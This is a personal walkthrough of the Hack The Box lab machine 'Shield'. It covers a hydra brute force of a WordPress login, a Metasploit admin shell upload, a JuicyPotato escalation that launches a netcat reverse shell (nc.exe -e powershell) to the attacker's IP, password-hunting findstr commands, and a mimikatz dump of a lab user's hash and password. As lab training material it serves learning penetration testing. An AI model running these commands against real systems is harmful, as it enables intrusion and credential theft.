# Shield
IP: 10.10.10.29

Tis is the 4th box in the HTB Starting Point zone.  It's a Windows box with no user flag.  Let's see what we find :)

(Note: this box took me several days before I finally looked at the writeup.  Scroll to the bottm for [the final solution](#day-5-clean-walkthrough)

## Day 1

Going to start with some light discovery and see how far we get.  The day is already half over after playing around with Vaccine (Box #3) so might not get too far before I get tired and drop off...

### The Scan

This time I've made a bash alias for my scanning, but it's still just -oA nmap -O -sV -sC -sS flags:
```
└─$ scan 10.10.10.29
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 17:48 EDT
Nmap scan report for 10.10.10.29
Host is up (0.014s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we have a basic IIS server and a mysql server without login credentials?  Too easy... right?

### MySQL

Because that would definitely be the bees knees if we can get a shell by just logging into the DB, let's try that first...

```
└─$ mysql -h 10.10.10.29
ERROR 1130 (HY000): Host '10.10.14.47' is not allowed to connect to this MySQL server
```

Ohhh... that's what `unauthorized` means :P  Okay, on to the website...

### The Website

The homepage looks pretty stock and standard, so let's toss it into dirbuster.  Trying with .asp, aspx, and .html extensions first and let's let it run...

Bam.  Wordpress.  Scratch that.  Switching to .php extensions and restarting.

We can come back to that later, but let's kick off `wpsacn`...

### WPScan: The WordPress Vulnerability Scanner

Throwing it into a terminal:

```
└─$ wpscan --url http://10.10.10.29/wordpress/
...
Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.29/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.10.29/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://10.10.10.29/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
[i] Plugin(s) Identified:

[+] mesmerize-companion
 | Location: http://10.10.10.29/wordpress/wp-content/plugins/mesmerize-companion/
 | Latest Version: 1.6.126
 | Last Updated: 2021-07-20T11:11:00.000Z

```

Wordpress 5.2.1 is identified as insecure. Let's ask Google why... and we find https://wpscan.com/wordpress/521  -- looks like the most interesting thing here is a potential object injection for the PHPMailer.  They did have a contact form, let's stash this knowledge for the moment and see what else we can find.

### BurpSuite

I'm going to run an active scan on the WordPress site and see if Burp finds anything obvious.

It does not.  I pick a couple other pages and also nothing obvious.

Oh, but then I remember... password re-use... (I peaked at the walkthrough :( )

### Logging in as Admin

Okay, they fooled me twice.  Shame on me.  I need to re-use the password from a previous machine again so let's try that.  This time, however, let's put it in a modified fasttrack.txt and use hydra for good practice (you know, for the next webform that's gonna try and trick me up).

```
sudo hydra -I -v -f -l admin -P ~/fasttrack.txt 10.10.10.29 http-post-form "/wordpress/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1:is incorrect"
```

-I = ignore existing session, don't try to recover (useful for debugging this command)
-v = verbose, show me everything
-f = stop after you find a match
-l = the username to try
-P = the password file we modified
then, in order, it's <IP> <method> "<path>:<payload string>:<failure text>"

```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these _ ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-25 21:17:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 228 login tries (l:1/p:228), ~15 tries per task
[DATA] attacking http-post-form://10.10.10.29:80/wordpress/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1:is incorrect
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.10.10.29/wordpress/wp-admin/

[80][http-post-form] host: 10.10.10.29   login: admin   password: P@s5w0rd!
[STATUS] attack finished for 10.10.10.29 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-25 21:17:54
```

So we have success, and the password as we expect is `P@s5w0rd!` -- now we're logged in.

### The WordPress Admin

So there's a couple things to note.  You could fire up metasploit and use the wp module to spawn a shell, I'm guessing with a custom plugin, or you could have fun and write your own.  I tried to shoehorn the php-reverse-shell into a shortcode plugin and it worked... kinda... the only problem is that the default php-reverse-shell relies on the server being Linux.

This is IIS.

### Exfiltration

So we have to write a reverse shell that runs on IIS... how do we do that?

With `cmd.exe` and `nc -C` -- the `-C` causes netcat to send CRLF which is necessary for Windows.  

I wasn't able to get this to work quite right, though, so I settled for a simple $_GET based shell, and asked for `more wp-config.php` -- this gave me db credentials and I've saved this to a file.

### End of Day 1

So at this point we're logged into the WP Admin and we can tentatively get a reverse shell.  Right now, though, all I have is a php script reading commands from GET variables and sometimes echoing their output onto the page.  

For now, we have DB credentials but can't talk to the MySQL db from a remote host so this might not be horribly helpful.

Next Steps:

* Get a working reverse shell on IIS, turns out it's not super simple, though I'm sure it's much easier the second time around.  Probably easiest to just use PowerShell, so I should get comfortable with that avenue.
* There is no User flag, accept it
* Find some sort of credentials somewhere on the box that allow me to log in as administrator
* Get the administrator flag from their desktop
* Look around the box for clues to use on the next system

## Day 2

1. Got a shell using the techniques in Archetype -- notably hosting a PowerShell reverse shell script and then downloading/executing it on the remote box
2. Found some interesting files by poking around with `ls -force -recurse /user`

```
C:\users\All Users\VMware\VMware VGAuth
C:\users\All Users\MySQL\MySQL Server 5.1\data
C:\users\All Users\MySQL\MySQL Installer for Windows
C:\users\All Users\Microsoft\Windows\Start Menu\Programs\Administrative Tools
C:\users\All Users\Microsoft\Windows\ClipSVC
C:\users\All Users\Microsoft\User Account Pictures
```

### Peaking at the Writeup

After looking through all of these, I realize I actually have no idea what I'm doing.  I find a couple resources on windows priv esc, bookmark them for tomorrow, and take a peak at the writeup.

The writeup says to use a local privilege escalation vulnerability in Windows OS 2016 -- I would not have figured that out :)  Turns out there's a tool called "windows exploit suggester" which recommends this given the output of `systeminfo`

In powershell, when I run `systeminfo` I see:

```
Host Name:                 SHIELD
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30000-00299-AA303
Original Install Date:     2/4/2020, 12:58:01 PM
System Boot Time:          7/26/2021, 2:07:38 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 963 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,283 MB
Virtual Memory: In Use:    1,148 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    MEGACORP.LOCAL
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.29
                                 [02]: fe80::1507:b3ec:d3e:24dc
                                 [03]: dead:beef::1507:b3ec:d3e:24dc
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Dropping this in a text file on Kali (copy paste) and running the `wes` python module:

```
└─$ pip install wesng                
└─$ python3 -m wes --update     
└─$ python3 -m wes systeminfo.txt  | tee wes.out

Windows Exploit Suggester 0.98 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows Server 2016
    - Generation: 2016
    - Build: 14393
    - Version: 1607
    - Architecture: x64-based
    - Installed hotfixes: None
[+] Loading definitions
    - Creation date of definitions: 20210720
[+] Determining missing patches
[+] Filtering duplicate vulnerabilities
[+] Found vulnerabilities
...
[+] Done. Displaying 384 of the 384 vulnerabilities found.


└─$ cat wes.out | grep "Elevation of Privilege" | wc -l
244

```

Suffice it to say this machine has lots of holes, and quite a few ways to elevate privileges.  We will try one of these after we read through the following resources:

* Privilege cheat sheet :  https://github.com/gtworek/Priv2Admin
* OSCP Windows Priv Esc Guide : https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
* Fuzzy Security Priv Esc Guide : https://www.fuzzysecurity.com/tutorials/16.html

### End of Day 2

Today we peaked at the writeup for privilege escalation advice, and I'm really glad I did because the path I was taking (looking at files) wasn't paying off.

Next Steps:
* Go through the OSCP guide on Windows Privilege Escalation
* Go through the Fuzzy Security Priv Esc tutorial
* Pop the root flag with MSF
* Pop the root flag with an exploit we download
* Pop the root flag with an exploit we write (? Can we?  Will we give up first?)

## Day 3 + 4

Since I looked at the writeup, I played a bit with Metasploit Framework and found a couple things out:

1. MSF Enum doesn't always work the way I'd want it to
2. Meterpreter stage 2 shells don't always work the way you expect.  If you're trying to use the "shell" command, it can lockup and kill your channel.  A netcat shell can actually be more stable.
3. Meterpreter lets you upload files effortlessly
4. JuicyPotato works if you have SeImpersonatePrivilege on a service account
5. Sometimes mimikatz.exe does what you'd expect.  If not, make sure you didn't typo the command.  Also, I think case matters...
6. IF mimikatz.exe doesn't work like you'd expect it to, it could be a User Access Control issue

And finally, Windows Privilege Escalation is a big black hole that I could throw myself into for years and possibly never fully understand all the magic.  There's layers and layers of security interactions between services that I've never even heard of using tokens and protocols I don't understand.  For now, I'm going to say that the official writeup is good enough, that the concept of DCOM impersonation is pretty cool and also not something I need to understand at this level, and the fact that I have the root flag is good enough to move on from this box.

But before we move on, let's do one more clean walkthrough from the very beginning...


## Day 5 - Clean Walkthrough

These are the steps we'll outline as we work our way through this box:

1. The initial nmap scan
2. Exploration of the website
3. The initial foothold
4. Privilege Escalation
5. Post Exploitation

### The Initial Nmap Scan

For this we don't need anything super fancy.  Load up nmap and point it at 10.10.10.29 and let it go:

```
## Here I'm outputting to a file in all formats (-oA) with both OS (-O) and Service (-sV) discovery.
## I'm also running the default scripts (-sC) and executing a "SYN" scan (-sS) on the target IP

└─$ sudo nmap -oA nmap -O -sV -sC -sS 10.10.10.29                                                                                                                                                                                        1 ⨯
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-30 18:54 EDT
Nmap scan report for 10.10.10.29
Host is up (0.015s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds
```

So we have an HTTP server and a database that we can't talk to (unauthorized means we can't talk to it, not that it allows anonymous access)

### The Web Server

Navigating to http://10.10.10.29 in our browser we see the default IIS homepage.  Nothing interesting here, so let's use dirbuster: ![Dirbuster config settings](images/dirbuster.png)

And we get some interesting result:
![Dirbuster results](images/dirbuster-results.png)

### WordPress

http://10.10.10.29/wordpress shows a basic website and, when we scan it with wpscan, there's no obvious RCEs.  WPScan does reveal that it's wordpress 5.2.1 but google confirms that there's just a few XSS and authenticated attacks available.  So either WordPress isn't a vector, or we have to brute force the login page.

We know from our previous boxes that this company re-uses passwords, and it's always a good thing to try the passwords we already know:

• MEGACORP_4dm1n!!
• M3g4c0rp123
• M3g4C0rpUs3r!
• qwerty789
• P@s5w0rd!
• mc@F1l3ZilL4

Out of these, “P@s5w0rd!” lets us login as “admin” and we're off to the races.

### Getting a Foothold 

There's a couple ways to do this.  My initial thought was to use a simple PHP backdoor that I wrote and install it as a plugin which registered a shortcode to trigger the RCE.  This worked fine, and I'll leave this as an exploration point because I don't like posting code for trojans.

That said, there's a simpler way and that's with metasploit!

Open up msfconsole, select the wp_admin_plugin_shell exploit, configure it, and run:

```cli

└─$ msfconsole
...
msf6 > search wp admin plugin shell
...
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
...
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD P@s5w0rd!
PASSWORD => P@s5w0rd!
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.29
RHOSTS => 10.10.10.29
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 10.10.14.47
LHOST => 10.10.14.47
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.14.47:4444 
[*] Authenticating with WordPress using admin:P@s5w0rd!...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/PFXsVTyXHh/YeJNgFxBmR.php...
[*] Sending stage (39282 bytes) to 10.10.10.29
[+] Deleted YeJNgFxBmR.php
[+] Deleted PFXsVTyXHh.php
[*] Meterpreter session 1 opened (10.10.14.47:4444 -> 10.10.10.29:50156) at 2021-07-30 20:10:02 -0400
[!] This exploit may require manual cleanup of '../PFXsVTyXHh' on the target

meterpreter > 
```

Now we have a Meterpreter shell.

There is no user.txt on this box, so we need to get Administrator access to get the flag.

### Privilege Escalation

In Windows, from what I can tell at this point, most priv esc is done through exploits.  We can search around for passwords with these commands:

```
# List all env variables
set
Get-ChildItem Env: | ft Key,Value

# Search for passwords
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

# search for interesting files
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

But on this box, none of this reveals anything interesting.  

So we grab systeminfo and see if we can find anything with "Windows Exploit Suggester"

```shell
meterpreter > execute -f powershell -a '"systeminfo > outfile"'
Process 5096 created.
meterpreter > cat outfile
��
Host Name:                 SHIELD
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30000-00299-AA303
Original Install Date:     2/4/2020, 12:58:01 PM
System Boot Time:          8/1/2021, 2:49:58 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 951 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,241 MB
Virtual Memory: In Use:    1,190 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    MEGACORP.LOCAL
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4520724
                           [03]: KB4524244
                           [04]: KB4537764
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.29
                                 [02]: fe80::d141:4e11:82e2:4d82
                                 [03]: dead:beef::d141:4e11:82e2:4d82
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Running this through `wes` does reveal a large number of privilege escalation vulnerabilities, but the CVEs are not readily available as an exploit given a scripted search through exploitdb.

We do need to escalate privileges, though, so let's try another tool called "WinPEAS" aka Windows Privilege Escalation Awesome Scripts.  This checks for several "hattricks" to escalate privileges.

### PEAS

WinPEAS can be downloaded from https://github.com/carlospolop/PEASS-ng and then we can upload it to our target with MSF

```
meterpreter > upload winpeas.exe
meterpreter > execute -f powershell -a "./winpeas.exe > peas.out"
... wait a few minutes for this to finish ...
meterpreter > download peas.out
... in another shell ...
$ more peas.out
```

Interesting snips from peas.out:

```
 [!] CVE-2019-1064 : VULNERABLE
 [!] CVE-2019-1130 : VULNERABLE
 [!] CVE-2019-1315 : VULNERABLE
 [!] CVE-2019-1388 : VULNERABLE
 [!] CVE-2019-1405 : VULNERABLE
 [!] CVE-2020-1013 : VULNERABLE
 [*] Finished. Found 6 potential vulnerabilities.
...
    LSA Protection is not enabled
    CredentialGuard is not enabled
...
    No AV was detected!!
...
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
...
    Some AutoLogon credentials were found
    DefaultDomainName             :  MEGACORP
    DefaultUserName               :  sandra
...
```

So while there are several CVEs available, we also have SeImpersonatePrivilege.  This can mean that JuicyPotato could be used to spawn a shell as admin, so let's give that a shot.

Oh, and "sandra" is automatically logged in which could come in handy during post exploitation when we scrape for creds with mimikatz.

### JuicyPotato

For this you can download it from https://github.com/ohpe/juicy-potato/releases/tag/v0.1 and then upload to the box just as before.

This time, to run it you'll need both nc.exe and a script which we will call with JuicyPotato so let's get those on the box as well.

```
meterpreter > upload nc.exe
meterpreter > upload JuicyPotato.exe
meterpreter > execute -f powershell -a "echo 'START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell 10.10.14.47 1111' > shell.bat"
... in another shell ...
$ nc -nlvp 1111
... back in meterpreter ... 
meterpreter > execute -f JuicyPotato.exe -a "-t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337"
... and now in our other shell ... 
$ nc -nlvp 1111
listening on [any] 1111 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.29] 60692
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> 
```

We are now root.  The flag is in C:\Users\Administrator\Desktop\root.txt

### Post Exploitation

The last bit on this box is to run mimikatz and see if we can scrape any passwords, so let's try that.

```
meterpreter > lcd /usr/share/windows-resources/mimikatz/x64
meterpreter > upload mimikatz.exe
...
PS C:\users\administrator\desktop> cd C:\inetpub\wwwroot\wordpress\wp-content\uploads
PS C:\inetpub\wwwroot\wordpress\wp-content\uploads> mimikatz.exe
...
mimikatz # sekurlsa::logonpasswords
...
PS C:\inetpub\wwwroot\wordpress\wp-content\uploads> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::logonpasswords

... snip ...

Authentication Id : 0 ; 282626 (00000000:00045002)
Session           : Interactive from 1
User Name         : sandra
Domain            : MEGACORP
Logon Server      : PATHFINDER
Logon Time        : 8/2/2021 1:42:03 AM
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
        msv :
         [00000003] Primary
         * Username : sandra
         * Domain   : MEGACORP
         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
        tspkg :
        wdigest :
         * Username : sandra
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :
         * Username : sandra
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!
        ssp :
        credman :
... snip ...
```

And there we have Sandra's password.  

Done :)







